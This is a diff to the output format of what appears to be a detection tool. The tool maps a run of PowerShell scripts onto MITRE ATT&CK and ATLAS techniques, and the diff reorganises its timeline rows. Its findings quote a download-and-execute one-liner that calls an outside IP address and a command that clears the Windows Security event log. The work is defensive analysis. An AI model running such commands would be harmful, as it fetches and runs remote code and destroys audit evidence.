@@ -19,75 +19,64 @@ Tactics   (tactic, identifiers, files)
   [!] Stealth            TA0005, AML.TA0007  20261020_101000_step03_exec.ps1, 20261020_101500_step04_persist.ps1, 20261020_102000_step05_dotnet.ps1 and 3 more
   [i] Discovery          TA0007, AML.TA0008  20261020_100000_step01_recon.ps1, 20261020_102500_step06_pinvoke.ps1
 
-Timeline   (a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics, with each tactic and the techniques under it)
+Timeline   (a block for each intent, from the first of its files to be created until the last, or for each period of files that show the same tactics; a row is an ATT&CK technique, then its tactic and its ATLAS technique, or the tools that give a tactic no technique does)
   [i] Discovery                                                     2026-10-20T10:00:00Z
-      Discovery          TA0007, AML.TA0008  no MITRE ATT&CK technique identified
+      tools      whoami, nltest, net.exe, wmic.exe                               TA0007  Discovery
+      no MITRE ATT&CK technique identified
 
   [x] CommandAndControl                                             2026-10-20T10:05:00Z
-      CommandAndControl  TA0011, AML.TA0014  T1105      Ingress Tool Transfer
-                                             AML.T0072  Cyber Communication Channel
+      T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
 
   [!] Execution, Stealth                                            2026-10-20T10:10:00Z
-      Execution          TA0002, AML.TA0005  T1127      Trusted Developer Utilities Proxy Execution
-      Stealth            TA0005, AML.TA0007  T1218      System Binary Proxy Execution
-                                             T1127      Trusted Developer Utilities Proxy Execution
+      T1127      Trusted Developer Utilities Proxy Execution                     TA0002  Execution
+                                                                                 TA0005  Stealth
+      T1218      System Binary Proxy Execution                                   TA0005  Stealth
 
   [x] CommandAndControl                                             2026-10-20T10:12:00Z
-      CommandAndControl  TA0011, AML.TA0014  T1105      Ingress Tool Transfer
-                                             AML.T0072  Cyber Communication Channel
+      T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
 
   [x] Execution, Persistence, Stealth, DefenseImpairment            2026-10-20T10:15:00Z
-      Execution          TA0002, AML.TA0005  T1127      Trusted Developer Utilities Proxy Execution
-                                             T1053.005  Scheduled Task/Job: Scheduled Task
-      Persistence        TA0003, AML.TA0006  T1547.001  Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
-                                             T1053.005  Scheduled Task/Job: Scheduled Task
-                                             AML.T0142  Event Triggered Execution
-      Stealth            TA0005, AML.TA0007  T1218      System Binary Proxy Execution
-                                             T1127      Trusted Developer Utilities Proxy Execution
-      DefenseImpairment  TA0112, AML.TA0007  T1685.005  Disable or Modify Tools: Clear Windows Event Logs
-                                             AML.T0138  Indicator Removal
+      T1127      Trusted Developer Utilities Proxy Execution                     TA0002  Execution
+                                                                                 TA0005  Stealth
+      T1053.005  Scheduled Task/Job: Scheduled Task                              TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1547.001  Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder    TA0003  Persistence          AML.T0142  Event Triggered Execution
+      T1218      System Binary Proxy Execution                                   TA0005  Stealth
+      T1685.005  Disable or Modify Tools: Clear Windows Event Logs               TA0112  DefenseImpairment    AML.T0138  Indicator Removal
 
   [x] Stealth, CommandAndControl                                    2026-10-20T10:20:00Z
-      Stealth            TA0005, AML.TA0007  T1620      Reflective Code Loading
-      CommandAndControl  TA0011, AML.TA0014  T1105      Ingress Tool Transfer
-                                             AML.T0072  Cyber Communication Channel
+      T1620      Reflective Code Loading                                         TA0005  Stealth
+      T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
 
   [x] Discovery, Execution, Stealth, CommandAndControl              2026-10-20T10:25:00Z to 2026-10-20T10:26:00Z
-      Discovery          TA0007, AML.TA0008  no MITRE ATT&CK technique identified
-      Execution          TA0002, AML.TA0005  T1059.001  Command and Scripting Interpreter: PowerShell
-                                             T1106      Native API
-                                             T1059      Command and Scripting Interpreter
-                                             T1047      Windows Management Instrumentation
-                                             AML.T0050  Command and Scripting Interpreter
-      Stealth            TA0005, AML.TA0007  T1055      Process Injection
-                                             T1027.004  Obfuscated Files or Information: Compile After Delivery
-                                             T1620      Reflective Code Loading
-                                             AML.T0123  Obfuscated Files or Information
-      CommandAndControl  TA0011, AML.TA0014  T1105      Ingress Tool Transfer
-                                             T1095      Non-Application Layer Protocol
-                                             AML.T0072  Cyber Communication Channel
+      tools      whoami                                                          TA0007  Discovery
+      T1059.001  Command and Scripting Interpreter: PowerShell                   TA0002  Execution            AML.T0050  Command and Scripting Interpreter
+      T1106      Native API                                                      TA0002  Execution
+      T1059      Command and Scripting Interpreter                               TA0002  Execution            AML.T0050  Command and Scripting Interpreter
+      T1047      Windows Management Instrumentation                              TA0002  Execution
+      T1055      Process Injection                                               TA0005  Stealth
+      T1027.004  Obfuscated Files or Information: Compile After Delivery         TA0005  Stealth              AML.T0123  Obfuscated Files or Information
+      T1620      Reflective Code Loading                                         TA0005  Stealth
+      T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
+      T1095      Non-Application Layer Protocol                                  TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
 
   [x] DefenseImpairment, CommandAndControl                          2026-10-20T10:30:00Z
-      DefenseImpairment  TA0112, AML.TA0007  T1685.005  Disable or Modify Tools: Clear Windows Event Logs
-                                             AML.T0138  Indicator Removal
-      CommandAndControl  TA0011, AML.TA0014  T1105      Ingress Tool Transfer
-                                             AML.T0072  Cyber Communication Channel
+      T1685.005  Disable or Modify Tools: Clear Windows Event Logs               TA0112  DefenseImpairment    AML.T0138  Indicator Removal
+      T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
 
   [x] Execution, Persistence, Stealth, DefenseImpairment, CommandAndControl  2026-10-20T10:35:00Z
-      Execution          TA0002, AML.TA0005  T1127      Trusted Developer Utilities Proxy Execution
-                                             T1053.005  Scheduled Task/Job: Scheduled Task
-      Persistence        TA0003, AML.TA0006  T1053.005  Scheduled Task/Job: Scheduled Task
-      Stealth            TA0005, AML.TA0007  T1218      System Binary Proxy Execution
-                                             T1127      Trusted Developer Utilities Proxy Execution
-      DefenseImpairment  TA0112, AML.TA0007  T1685.005  Disable or Modify Tools: Clear Windows Event Logs
-                                             AML.T0138  Indicator Removal
-      CommandAndControl  TA0011, AML.TA0014  T1105      Ingress Tool Transfer
-                                             AML.T0072  Cyber Communication Channel
+      T1127      Trusted Developer Utilities Proxy Execution                     TA0002  Execution
+                                                                                 TA0005  Stealth
+      T1053.005  Scheduled Task/Job: Scheduled Task                              TA0002  Execution
+                                                                                 TA0003  Persistence
+      T1218      System Binary Proxy Execution                                   TA0005  Stealth
+      T1685.005  Disable or Modify Tools: Clear Windows Event Logs               TA0112  DefenseImpairment    AML.T0138  Indicator Removal
+      T1105      Ingress Tool Transfer                                           TA0011  CommandAndControl    AML.T0072  Cyber Communication Channel
   and 1 file that shows no tactic, in the saved trace
 
 Findings
   activities
-    [x] DownloadAndExecute          1 line   CommandAndControl, Execution  T1059.001, T1105, AML.T0072, AML.T0050
+    [x] DownloadAndExecute          1 line   CommandAndControl, Execution  T1059.001, T1105, AML.T0050, AML.T0072
         what  IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
     [x] EventLogClearing            3 lines  DefenseImpairment             T1685.005, AML.T0138
         what  wevtutil cl Security (20261020_101500_step04_persist.ps1:3)
